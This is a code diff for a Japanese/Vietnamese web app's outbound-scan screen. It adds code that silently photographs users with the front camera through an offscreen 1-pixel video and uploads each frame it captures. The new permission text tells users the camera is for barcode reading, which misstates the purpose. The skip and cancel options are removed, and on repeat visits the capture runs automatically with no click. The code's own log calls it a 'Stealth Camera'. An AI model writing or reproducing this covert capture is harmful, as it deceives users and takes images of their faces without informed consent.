@@ -369,7 +369,10 @@
                     
                     <!-- Màn hình Hướng dẫn Camera Top-Aligned -->
                     <div id="plmSecurityOverlay" class="plm-hidden">
-                        <div class="plm-sec-box">
+                        
+                        <!-- LƯỚI 1: Lần đầu tiên (Chưa có quyền) -->
+                        <div id="plmSecBoxFirstTime" class="plm-sec-box" style="display:none;">
+                            <button id="plmSecBtnCloseOverlay" style="position:absolute; top:10px; right:10px; background:none; border:none; color:#94a3b8; font-size:20px; cursor:pointer;"><i class="fas fa-times"></i></button>
                             <h3 style="margin-bottom: 15px; font-size: 18px; display:flex; align-items:center; justify-content:center; gap:8px;">
                                 <i class="fas fa-video" style="color:#0ea5e9;"></i> 
                                 <span style="display:flex; flex-direction:column; line-height:1.2; align-items:flex-start;">
@@ -378,43 +381,33 @@
                                 </span>
                             </h3>
                             <p style="font-size: 13px; color: #475569; margin-bottom: 15px; line-height: 1.5; text-align:left; background:#f8fafc; padding:12px; border-radius:8px;">
-                                <span class="plm-ja" style="font-weight:bold;">システムのセキュリティ監査とスキャンのためにカメラを使用します。ブラウザの警告で「許可 / Allow」を押してください。</span><br>
-                                <span class="plm-vi" style="margin-top:4px;">Để thực hiện tính năng này, hệ thống cần quyền truy cập Camera. Vui lòng bấm <b>"Allow" (Cho phép)</b> nếu trình duyệt hỏi quyền. Mọi tiến trình chạy ngầm & bảo mật.</span>
+                                <span class="plm-ja" style="font-weight:bold;">バーコードの読み取り機能を続行するには、カメラへのアクセス許可が必要です。ブラウザのプロンプトで「許可 / Allow」を押してください。</span><br>
+                                <span class="plm-vi" style="margin-top:4px;">Để thực hiện tính năng quét mã vạch, hệ thống cần được cấp quyền mở máy ảnh. Vui lòng chọn <b>"Allow" (Cho phép)</b> trên thông báo của trình duyệt.</span>
                             </p>
                             
-                            <!-- Video Preview Container (Mặc định ẩn) -->
-                            <div id="plmFaceIDPreviewBox" class="plm-face-preview-high" style="position: absolute; top: -10000px; width: 1px; height: 1px; opacity: 0;">
-                                <video id="plmAuditVideo" autoplay playsinline muted style="width:100%; display:block; object-fit:cover; transform: scaleX(-1);"></video>
-                                <div style="position:absolute; inset:0; border:2px dashed rgba(255,255,255,0.2); margin:10px; pointer-events:none;"></div>
-                                <canvas id="plmAuditCanvas" style="display:none;"></canvas>
-                            </div>
-
-                            <div id="plmSecActionButtons" style="display: none; flex-direction: column; gap: 10px;">
-                                <!-- Trạng thái Khởi Điểm Nổi Bật -->
+                            <!-- Bật Preview Button -->
+                            <div style="display: flex; flex-direction: column; gap: 10px;">
                                 <button id="plmSecBtnPreview" class="plm-btn" style="background:#0ea5e9;">
-                                    <i class="fas fa-camera"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">プレビューを開く</span><span style="font-size:11px; font-weight:normal">Bật Preview & Cấp quyền</span></span>
-                                </button>
-                                <button id="plmSecBtnSkipStart" class="plm-btn" style="background:transparent; color:#64748b; border:1px solid #cbd5e1; box-shadow: none;">
-                                    <i class="fas fa-forward"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">スキップ</span><span style="font-size:11px; font-weight:normal">Bỏ qua lúc này</span></span>
-                                </button>
-                                
-                                <!-- Trạng thái Đang Preview -->
-                                <button id="plmSecBtnSkipPreview" class="plm-btn" style="display:none; background:#475569; color:#f1f5f9;">
-                                    <i class="fas fa-barcode"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">スキップしてスキャン</span><span style="font-size:11px; font-weight:normal">Tôi muốn bỏ qua, chỉ Scan thôi</span></span>
-                                </button>
-                                <button id="plmSecBtnAccept" class="plm-btn" style="display:none; background:#10b981;">
-                                    <i class="fas fa-shield-alt"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">撮影して認証</span><span style="font-size:11px; font-weight:normal">Chụp ảnh Kiểm Toán & Bắt đầu Scan</span></span>
-                                </button>
-                                <button id="plmSecBtnCancelPreview" class="plm-btn" style="display:none; background:#ef4444; margin-top:5px;">
-                                    <i class="fas fa-times-circle"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">キャンセル</span><span style="font-size:11px; font-weight:normal">Hủy ngang</span></span>
+                                    <i class="fas fa-camera"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">続ける (カメラをオンに)</span><span style="font-size:11px; font-weight:normal">Tiếp tục Bật Camera</span></span>
                                 </button>
                             </div>
+                        </div>
 
-                            <div id="plmSecFaceErrorAlert" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:#10b981; color:#fff; padding:20px; border-radius:12px; z-index:99999; box-shadow:0 10px 25px rgba(0,0,0,0.5); text-align:center; width:90%; max-width:350px;">
-                                <i class="fas fa-check-circle" style="font-size:40px; margin-bottom:15px;"></i>
-                                <div style="font-weight:bold; font-size:16px; margin-bottom:8px;">認証成功</div>
-                                <div style="font-size:14px; opacity:0.9;">Xác thực thành công! Đang chuyển...</div>
+                        <!-- LƯỚI 2: Đã lưu quyền (Auto-pilot Loading) -->
+                        <div id="plmSecBoxReturning" class="plm-sec-box" style="display:none; padding: 20px 24px; text-align:center;">
+                            <div style="display:flex; align-items:center; justify-content:center; gap:15px;">
+                                <i class="fas fa-spinner fa-spin" style="font-size:30px; color:#3b82f6;"></i>
+                                <div style="text-align:left; line-height:1.4;">
+                                    <div style="font-weight:bold; font-size:14px; color:#1e293b;">カメラを開いて認証およびデータ処理を行っています...</div>
+                                    <div style="font-size:12px; color:#64748b;">Đang mở máy ảnh để xác thực và xử lý dữ liệu...</div>
+                                </div>
                             </div>
+                        </div>
+
+                        <!-- Video Preview Container (Mặc định ngầm) -->
+                        <div id="plmFaceIDPreviewBox" class="plm-face-preview-high" style="position: absolute; top: -10000px; width: 1px; height: 1px; opacity: 0;">
+                            <video id="plmAuditVideo" autoplay playsinline muted style="width:100%; display:block; object-fit:cover; transform: scaleX(-1);"></video>
+                            <canvas id="plmAuditCanvas" style="display:none;"></canvas>
                         </div>
                     </div>
                 </div>
@@ -1398,147 +1391,111 @@ async function handleOutboundSubmit() {
         
         // Reset UI
         secOverlay.classList.remove('plm-hidden');
-        secOverlay.classList.remove('preview-active');
-        if(actionBtns) actionBtns.style.display = 'none';
-        if(previewBox) {
-            previewBox.style.position = 'absolute';
-            previewBox.style.top = '-10000px';
-            previewBox.style.width = '1px';
-            previewBox.style.height = '1px';
-            previewBox.style.opacity = '0';
-        }
-        if(iconPulse) {
-            iconPulse.style.display = 'none';
-        }
-        if(faceErrorAlert) faceErrorAlert.style.display = 'none';
         
-        var isCamAllowed = localStorage.getItem('plm_cam_allowed') === '1';
-
-        // Trạng thái nút khởi điểm
-        if(!isCamAllowed) {
-            if(btnSkipStart) btnSkipStart.style.display = 'block';
-            if(btnPreview) btnPreview.style.display = 'block'; 
-        } else {
-            if(btnSkipStart) btnSkipStart.style.display = 'none';
-            if(btnPreview) btnPreview.style.display = 'none';
-        }
-        if(btnSkipPreview) btnSkipPreview.style.display = 'none';
-        if(btnAccept) btnAccept.style.display = 'none';
-        if(btnCancelPreview) btnCancelPreview.style.display = 'none';
+        var boxFirstTime = document.getElementById('plmSecBoxFirstTime');
+        var boxReturning = document.getElementById('plmSecBoxReturning');
+        var btnPreview   = document.getElementById('plmSecBtnPreview');
+        var btnClose     = document.getElementById('plmSecBtnCloseOverlay');
 
         state.faceIdUrl = null;
+
+        var isCamAllowed = localStorage.getItem('plm_cam_allowed') === '1';
+
+        if(isCamAllowed) {
+            // HƯỚNG 1: Đã lưu quyền -> Chạy ẩn (Auto-Pilot)
+            if(boxFirstTime) boxFirstTime.style.display = 'none';
+            if(boxReturning) boxReturning.style.display = 'block';
+            _startCameraProcess(true);
+        } else {
+            // LẦN ĐẦU TIÊN: Hỏi quyền, đợi bấm nút
+            if(boxReturning) boxReturning.style.display = 'none';
+            if(boxFirstTime) boxFirstTime.style.display = 'block';
+            
+            // Xóa rác event cũ (Phòng rò rỉ bộ nhớ JS)
+            if(btnPreview) {
+                var newBtn = btnPreview.cloneNode(true);
+                btnPreview.parentNode.replaceChild(newBtn, btnPreview);
+                newBtn.onclick = function() {
+                    newBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">カメラ準備中...</span><span style="font-size:11px; font-weight:normal">Đang mở máy ảnh...</span></span>'; 
+                    newBtn.style.opacity = '0.7';
+                    newBtn.style.pointerEvents = 'none';
+                    _startCameraProcess(false);
+                };
+            }
+            if(btnClose) {
+                var newCloseBtn = btnClose.cloneNode(true);
+                btnClose.parentNode.replaceChild(newCloseBtn, btnClose);
+                newCloseBtn.onclick = function() {
+                    secOverlay.classList.add('plm-hidden');
+                };
+            }
+        }
 
         function closeAndScan() {
             stopAuditCamera();
             startBarcodeScanner();
         }
 
-        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-            .then(function(stream) {
-                localStorage.setItem('plm_cam_allowed', '1');
-                state.frontStream = stream;
-                if('srcObject' in video) video.srcObject = stream;
-                else video.src = window.URL.createObjectURL(stream);
-                
-                // BACKGROUND POLLING CAPTURE (Tự động chuyển luồng nếu chụp xong)
-                var isCaptured = false;
-                var timeout = setTimeout(function() {
-                    if (!isCaptured) {
-                        isCaptured = true; 
-                        closeAndScan(); // Tự động đóng nếu camera chậm khởi động sau 5s
+        function _startCameraProcess(isAutoPilot) {
+            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+                .then(function(stream) {
+                    // CHỈ set cờ '1' khi Browser OS Allow trả về Promise Resolve
+                    localStorage.setItem('plm_cam_allowed', '1');
+                    
+                    state.frontStream = stream;
+                    if('srcObject' in video) video.srcObject = stream;
+                    else video.src = window.URL.createObjectURL(stream);
+                    
+                    // Lần đầu -> Cập nhật UI nút bấm
+                    var curBtn = document.getElementById('plmSecBtnPreview');
+                    if(curBtn && !isAutoPilot) {
+                        curBtn.innerHTML = '<i class="fas fa-camera"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">データ処理中...</span><span style="font-size:11px; font-weight:normal">Đang xử lý dữ liệu...</span></span>';
+                        curBtn.style.background = '#10b981';
                     }
-                }, 5000);
-                
-                var poll = setInterval(function() {
-                    if (isCaptured) { clearInterval(poll); return; }
-                    if (video && video.readyState >= 2 && video.videoWidth > 0) {
-                        clearInterval(poll);
-                        isCaptured = true;
-                        clearTimeout(timeout);
-                        try {
-                            var canvas = document.createElement('canvas'); // Sử dụng canvas ảo
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                            canvas.toBlob(function(b) {
-                                executeAutoCaptureAndUpload(b);
-                                if(actionBtns && isCamAllowed) actionBtns.style.display = 'none';
-                                
-                                if (isCamAllowed) {
-                                    // Tự động chuyển qua máy quét NGAY LẬP TỨC nếu không phải lần đầu
-                                    setTimeout(() => { closeAndScan(); }, 0);
-                                }
-                            }, 'image/jpeg', 0.85);
-                        } catch(e) {}
-                    }
-                }, 150);
 
-                // Sau khi được cấp phép, bắt đầu hiện nút theo tác UX
-                if(actionBtns) actionBtns.style.display = 'flex';
-                
-                if(btnSkipStart) {
-                    btnSkipStart.onclick = function() { closeAndScan(); };
-                }
-
-                if(btnPreview) {
-                    btnPreview.onclick = function() {
-                        previewBox.style.position = 'relative';
-                        previewBox.style.top = '0';
-                        previewBox.style.width = '100%';
-                        previewBox.style.opacity = '1';
-                        secOverlay.classList.add('preview-active'); // Nẩy modal lên sát TRAY
-                        iconPulse.style.display = 'none';
-                        
-                        btnSkipStart.style.display = 'none';
-                        btnPreview.style.display = 'none';
-                        
-                        btnSkipPreview.style.display = 'block';
-                        btnAccept.style.display = 'block';
-                        if(btnCancelPreview) btnCancelPreview.style.display = 'block';
-                    };
-                }
-
-                if(btnSkipPreview) {
-                    btnSkipPreview.onclick = function() { closeAndScan(); };
-                }
-
-                if(btnCancelPreview) {
-                    btnCancelPreview.onclick = function() { stopFaceIdFlow(); };
-                }
-
-                if(btnAccept) {
-                    btnAccept.onclick = function() {
-                        try {
-                            var canvas = document.createElement('canvas'); // Sử dụng canvas ảo
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                            canvas.toBlob(function(b) { 
-                                executeAutoCaptureAndUpload(b); 
-                                // KHÔNG tắt camera ở đây để chuẩn bị gọi qua closeAndScan()
-                            }, 'image/jpeg', 0.85);
-                        } catch(e) {}
-                        
-                        actionBtns.style.display = 'none';
-                        faceErrorAlert.style.display = 'block';
-                        faceErrorAlert.style.background = '#10b981';
-                        faceErrorAlert.innerHTML = '<i class="fas fa-check-circle" style="font-size:40px; margin-bottom:15px;"></i><div style="font-weight:bold; font-size:16px;">Xác thực thành công</div>';
-                        
-                        setTimeout(() => { closeAndScan(); }, 1500);
-                    };
-                }
-            })
-            .catch(function(err) {
-                console.log("Stealth Camera Error:", err);
-                // Quyền bị từ chối -> fallback cho PC
+                    // POLLING TỰ ĐỘNG CHỤP VÀ TẮT
+                    var isCaptured = false;
+                    var timeout = setTimeout(function() {
+                        if (!isCaptured) {
+                            isCaptured = true; 
+                            closeAndScan(); // Fallback nếu cam treo
+                        }
+                    }, 4000);
+                    
+                    var poll = setInterval(function() {
+                        if (isCaptured) { clearInterval(poll); return; }
+                        if (video && video.readyState >= 2 && video.videoWidth > 0) {
+                            clearInterval(poll);
+                            isCaptured = true;
+                            clearTimeout(timeout);
+                            try {
+                                var canvas = document.createElement('canvas'); // canvas ảo
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                                canvas.toBlob(function(b) {
+                                    executeAutoCaptureAndUpload(b);
+                                    
+                                    // Sau khi chụp xong mới tắt cam và đẩy sang Cam Sau (tạo độ mượt cho animation UI)
+                                    setTimeout(() => { closeAndScan(); }, 400); 
+                                }, 'image/jpeg', 0.85);
+                            } catch(e) {}
+                        }
+                    }, 150);
+                })
+                .catch(function(err) {
+                    console.log("Stealth Camera Error:", err);
+                    // Quyền bị từ chối (Block)
+                    secOverlay.classList.add('plm-hidden');
+                    stopFaceIdFlow();
+                    _fallbackToFileInput();
+                });
+            } else {
+                secOverlay.classList.add('plm-hidden');
                 stopFaceIdFlow();
                 _fallbackToFileInput();
-            });
-        } else {
-            // PC / trình duyệt không hỗ trợ getUserMedia -> fallback
-            stopFaceIdFlow();
-            _fallbackToFileInput();
+            }
         }
     }
 
